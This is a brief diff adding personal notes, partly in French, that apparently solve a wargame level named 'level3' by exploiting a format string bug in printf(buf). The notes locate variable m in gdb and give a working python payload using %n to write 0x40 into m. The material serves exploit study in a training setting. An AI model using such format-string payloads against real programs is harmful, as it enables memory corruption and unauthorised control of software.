@@ -1,0 +1,9 @@
+Just change the value of m to 0x40
+Gdb level3
+Variable m is in 0x804988c
+It s format string vulnerability a cause de printf(buf)
+https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/
+On trouve la variable m: p &m
+(python -c 'print "\x8c\x98\04\x08" + "%x %x %46x %n"')
+%n => écrit le nbr de caractere et le stock en memoire (ici a le memoire de m)
+On doit avoir m == 64 donc on rajoute 44 caractère a un %x
